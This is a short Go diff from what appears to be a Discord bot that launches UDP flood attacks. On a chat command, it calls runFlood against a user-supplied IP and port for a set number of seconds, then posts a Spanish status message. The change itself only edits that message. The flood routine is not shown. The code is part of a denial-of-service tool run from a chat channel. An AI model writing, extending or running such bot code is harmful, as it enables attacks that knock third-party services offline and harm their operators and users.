@@ -120,7 +120,7 @@ func main() {
 				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque UDP enviado a %s:%d por %d segundos...", ip, port, duration))
 				go func() {
 					runFlood(ip, port, duration)
-					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque a %s:%d finalizado.", ip, port))
+					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque a %s:%d", ip, port))
 				}()
 				return
 			}
